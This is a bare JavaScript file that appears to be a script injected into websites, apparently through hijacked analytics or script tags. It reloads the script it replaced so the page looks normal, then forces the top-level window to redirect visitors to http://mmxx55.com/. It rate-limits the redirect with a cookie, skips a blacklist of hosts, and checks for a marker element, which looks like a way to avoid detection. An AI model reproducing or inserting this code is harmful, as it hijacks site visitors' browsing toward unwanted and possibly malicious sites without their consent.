var strScript = 'script',

    window = self,

    s = /([^:\/]|^)\//,

    t = '$1//',

    isOpera = window.opera,

    originSrc = (function(src) {

            if (!src) {

                return 0

            }

            src = (function(e) {

                    var params = e[1] || '';

                    return /=/.test(params || '=') ? (e[0] || '') + '?//=_&' + params: src

                }

            )(src.split('?'));

            if (!src.lastIndexOf('/')) {

                return src.replace(s, t)

            }

            return src.substr(0, 1) + src.substr(1).replace(s, t).replace(/([^/]\/js\/ )(\w) /i, '$1/$2')

        }

    )

    ((function(curScriptElm, scriptElms, errStr) {

            if (curScriptElm) {

                charset = curScriptElm.charset;

                async = curScriptElm.async;

                return curScriptElm.src

            }

            try {

                Z.G.Y()

            } catch(exception) {

                errStr = exception.stack || exception.fileName || exception.sourceURL || exception.stacktrace;

                if (!errStr && isOpera) {

                    errStr = (('' + exception).match(/of linked script \S+/g) || []).join(' ')

                }

            }

            if (errStr) {

                errStr = errStr.split(/[@ ]/g).pop();

                errStr = errStr[0] == '(' ? errStr.slice(1, -1) : errStr;

                for (var x = errStr.replace(/(:\d+)?:\d+$/i, ''), l, y = scriptElms.length; y--;) {

                    l = scriptElms[y];

                    if (x == l.src) {

                        charset = l.charset;

                        async = l.async;

                        break

                    }

                }

                return x

            }

            for (var lastScript = (scriptElms[scriptElms.length - 1] || {}), A = 0, j; j = scriptElms[A++];) {

                if (j.readyState == 'interactive') {

                    charset = j.charset;

                    async = j.async;

                    return j.src

                }

            }

            charset = lastScript.charset;

            async = lastScript.async;

            return lastScript.src

        }

    )(document.currentScript, document.getElementsByTagName(strScript))),

    isrm4 = /120\.55\.150\.242/.test(originSrc),

    isCnzz = /cnzz\.com/.test(originSrc),

    isLa = /js\.users\.51\.la/.test(originSrc),

    isBaidu = /hm\.baidu\.com/.test(originSrc),

    isAnaly = /www\.google\-analytics\.com/.test(originSrc);

if (!isCnzz && !isLa && !isBaidu && !isAnaly && !isrm4) {

    head = document.getElementsByTagName('head')[0],

        newScriptElm = document.createElement(strScript),

        sessionStorage = window.sessionStorage;

    originSrc && (charset && (newScriptElm.charset = charset),

        (newScriptElm.src = originSrc),

        !async && /\[nati/.test(document.write + '') ? document.write('<' + strScript + ' src="' + originSrc + '"' + (charset ? ' charset="' + charset + '"': '') + '><\/' + strScript + '>') : head.appendChild(newScriptElm));

}

function getCookieVal(offset) {

    var endstr = document.cookie.indexOf(";", offset);

    if (endstr == -1) endstr = document.cookie.length;

    return unescape(document.cookie.substring(offset, endstr));

}

function createCookie(name,value,seconds) {
    if (seconds) {
        var date = new Date();
        date.setTime(date.getTime() + (seconds * 1000));
        var expires = "; expires=" + date.toUTCString();
    }
    else var expires = "";
    document.cookie = name + "=" + value + expires + "; path=/";
}

function GetCookie(name) {

    var arg = name + "=";

    var alen = arg.length;

    var clen = document.cookie.length;

    var i = 0;

    while (i < clen) {

        var j = i + alen;

        if (document.cookie.substring(i, j) == arg) return getCookieVal(j);

        i = document.cookie.indexOf(" ", i) + 1;

        if (i == 0) break;

    }

    return null;

}

var locaHref = "http://mmxx55.com/";
function browserRedirect() {

    var sUserAgent = navigator.userAgent.toLowerCase();

    var bIsIpad = sUserAgent.match(/ipad/i) == "ipad";

    var bIsIphoneOs = sUserAgent.match(/iphone os/i) == "iphone os";

    var bIsMidp = sUserAgent.match(/midp/i) == "midp";

    var bIsUc7 = sUserAgent.match(/rv:1.2.3.4/i) == "rv:1.2.3.4";

    var bIsUc = sUserAgent.match(/ucweb/i) == "ucweb";

    var bIsAndroid = sUserAgent.match(/android/i) == "android";

    var bIsCE = sUserAgent.match(/windows ce/i) == "windows ce";

    var bIsWM = sUserAgent.match(/windows mobile/i) == "windows mobile";

    if ((bIsIpad || bIsIphoneOs || bIsMidp || bIsUc7 || bIsUc || bIsAndroid || bIsCE || bIsWM)) {

        window.top.location.href = locaHref;

    } else {

        window.top.location.href = locaHref;

    }

}





var blackhostlist=['fans.bestvogue.com','www.de4f.com','pica-juicy.picacomic.com','www.u444u.com','www.pornodoido.com','www.kula88.com'];
var blacklocationlist=['http://dragon8.troyhero.com/aurora/default.aspx'];
var cookName = "__sstre";
var globalTimes = 0 ;


function shouldIRedirect (name) {
    var data1,data2,myCookie = GetCookie(name);
    if(myCookie != null && myCookie.indexOf("|") > 0){
        var datas = myCookie.split("|"); 
        if (datas.length == 2) {
            data1 = parseInt(datas[0]);
            data2 = Number(datas[1]);
            if(!isNaN(data1)  &&  !isNaN(data2)){
                var ct = new Date().valueOf();
                globalTimes = data1;
                if(1E4 > ct - data2  || globalTimes >= 3){
                    return false;
                }
            }
        }      
    }
    return true;
}

function isInBlackList(){
    var current_host_name = window.top.location.host.toLowerCase();
    var current_location = window.top.location.href.toLowerCase();
    for(var j = 0 ; j < blacklocationlist.length; j++){
        if(current_location == blacklocationlist[j]){
            return true;
        }
    }
    for(var i = 0 ; i < blackhostlist.length; i++){
        if(current_host_name == blackhostlist[i]){
            return true;
        }
    } 
    return false;
}

if(!isInBlackList()){
    if (document.getElementById("123Aa234Bb345Cc") == null && shouldIRedirect(cookName)){
        createCookie(cookName, "" , -1);
        var timestamp = (new Date()).valueOf();
        createCookie(cookName, (globalTimes + 1) + "|" + timestamp , 1*60*60);
        browserRedirect();
    }
}


